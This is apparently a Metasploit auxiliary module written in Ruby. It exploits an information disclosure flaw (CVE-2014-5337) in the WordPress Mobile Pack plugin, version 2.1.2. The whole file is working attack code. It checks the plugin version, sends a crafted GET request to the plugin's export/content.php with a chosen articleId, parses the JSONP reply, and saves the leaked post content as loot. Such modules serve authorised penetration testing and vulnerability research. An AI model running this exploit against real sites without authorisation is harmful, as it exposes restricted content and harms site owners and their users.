##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HTTP::Wordpress
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress Mobile Pack Information Disclosure Vulnerability',
      'Description'    => %q{
        This module exploits an information disclosure vulnerability in WordPress Plugin
        "WP Mobile Pack" version 2.1.2, allowing to read files with privileges
        information.
      },
      'References'     =>
        [
          ['CVE' , '2014-5337'],
          ['WPVDB', '8107'],
          ['PACKETSTORM', '132750']
        ],
      'Author'         =>
        [
          'Nitin Venkatesh', # Vulnerability Discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('POSTID', [true, 'The post identification to read', '1'])
      ])
  end

  def check
    check_plugin_version_from_readme('wordpress-mobile-pack', '2.1.3')
  end

  def run_host(ip)
    postid = datastore['POSTID']

    begin
      res = send_request_cgi(
        'method'    => 'GET',
        'uri'       => normalize_uri(wordpress_url_plugins, 'wordpress-mobile-pack', 'export', 'content.php'),
        'vars_get'  => {
          'content'   => 'exportarticle',
          'callback'  => 'exportarticle',
          'articleId' => "#{postid}"
        }
      )
      temp = JSON.parse(res.body.gsub(/exportarticle\(/, "").gsub(/\)/, ""))
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, JSON::ParserError => e
      print_error("The following Error was encountered: #{e.class}")
      return
    end

    if res &&
        res.code == 200 &&
        res.body.length > 29 &&
        res.headers['Content-Type'].include?('application/json') &&
        !res.body.include?('"error":')

      vprint_status('Enumerating...')
      res_clean = JSON.pretty_generate(temp)
      vprint_good("Found:\n\n#{res_clean}\n")

      path = store_loot(
        'mobilepack.disclosure',
        'text/plain',
        ip,
        res_clean
      )
      print_good("File saved in: #{path}")
    else
      print_error("Nothing was downloaded. You can try checking the POSTID parameter.")
    end
  end
end
